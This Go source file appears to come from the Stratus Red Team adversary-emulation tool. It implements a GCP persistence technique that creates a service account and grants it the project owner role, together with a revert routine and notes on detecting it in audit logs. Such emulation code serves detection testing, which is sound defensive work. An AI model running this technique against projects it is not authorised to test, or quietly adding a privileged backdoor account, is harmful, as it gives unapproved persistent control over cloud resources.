package gcp

import (
	"context"
	_ "embed"
	"errors"
	"fmt"
	"github.com/datadog/stratus-red-team/v2/internal/providers"
	gcp_utils "github.com/datadog/stratus-red-team/v2/internal/utils/gcp"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	iam "google.golang.org/api/iam/v1"

	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.persistence.create-admin-service-account",
		FriendlyName: "Create an Admin GCP Service Account",
		Description: `
Establishes persistence by creating a new service account and assigning it 
<code>owner</code> permissions inside the current GCP project.

Warm-up: None

Detonation:

- Create a service account
- Update the current GCP project's IAM policy to bind the service account to the <code>owner</code> role'

References:

- https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/
`,
		Detection: `
Using the following GCP Admin Activity audit logs events:

- <code>google.iam.admin.v1.CreateServiceAccount</code>
- <code>SetIamPolicy</code> with <code>resource.type=project</code>
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence, mitreattack.PrivilegeEscalation},
		Detonate:                   detonate,
		Revert:                     revert,
		PrerequisitesTerraformCode: tf,
	})
}

const roleToGrant = "roles/owner"

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	gcp := providers.GCP()
	serviceAccountName := params["service_account_name"]
	serviceAccountEmail := getServiceAccountEmail(serviceAccountName, gcp.ProjectId)

	if err := createServiceAccount(gcp, serviceAccountName); err != nil {
		return err
	}

	if err := gcp_utils.GCPAssignProjectRole(gcp, "serviceAccount:"+serviceAccountEmail, roleToGrant); err != nil {
		return err
	}

	return nil
}

// createServiceAccount creates a new service account inside of a GCP project
func createServiceAccount(gcp *providers.GCPProvider, serviceAccountName string) error {
	iamClient, err := iam.NewService(context.Background(), gcp.Options())
	if err != nil {
		return errors.New("Error instantiating GCP IAM Client: " + err.Error())
	}
	serviceAccountDisplayName := fmt.Sprintf("%s (service account used by stratus red team)", serviceAccountName)
	serviceAccountEmail := getServiceAccountEmail(serviceAccountName, gcp.GetProjectId())
	path := fmt.Sprintf("projects/%s", gcp.GetProjectId())

	log.Println("Creating service account " + serviceAccountName)
	_, err = iamClient.Projects.ServiceAccounts.Create(path, &iam.CreateServiceAccountRequest{
		AccountId:      serviceAccountName,
		ServiceAccount: &iam.ServiceAccount{DisplayName: serviceAccountDisplayName},
	}).Do()
	if err != nil {
		return errors.New("Unable to create service account: " + err.Error())
	}
	log.Println("Successfully created service account " + serviceAccountEmail)
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	gcp := providers.GCP()
	serviceAccountName := params["service_account_name"]
	serviceAccountEmail := getServiceAccountEmail(serviceAccountName, gcp.ProjectId)

	// Attempt to remove the role from the service account in the project's IAM policy
	if err := gcp_utils.GCPUnassignProjectRole(gcp, "serviceAccount:"+serviceAccountEmail, roleToGrant); err != nil {
		// display a warning (but continue) in case of error
		log.Println("Warning: unable to remove role from service account: " + err.Error())
	}

	// Remove service account itself
	return removeServiceAccount(gcp, serviceAccountName)
}

func removeServiceAccount(gcp *providers.GCPProvider, serviceAccountName string) error {
	iamClient, err := iam.NewService(context.Background(), gcp.Options())
	if err != nil {
		return errors.New("Error instantiating GCP IAM Client: " + err.Error())
	}

	log.Println("Removing service account " + serviceAccountName)
	_, err = iamClient.Projects.ServiceAccounts.Delete(getServiceAccountPath(serviceAccountName, gcp.GetProjectId())).Do()
	if err != nil {
		return errors.New("Unable to delete service account: " + err.Error())
	}
	return nil
}

// Utility functions

func getServiceAccountPath(name string, projectId string) string {
	return fmt.Sprintf("projects/-/serviceAccounts/%s", getServiceAccountEmail(name, projectId))
}

func getServiceAccountEmail(name string, projectId string) string {
	return fmt.Sprintf("%s@%s.iam.gserviceaccount.com", name, projectId)
}
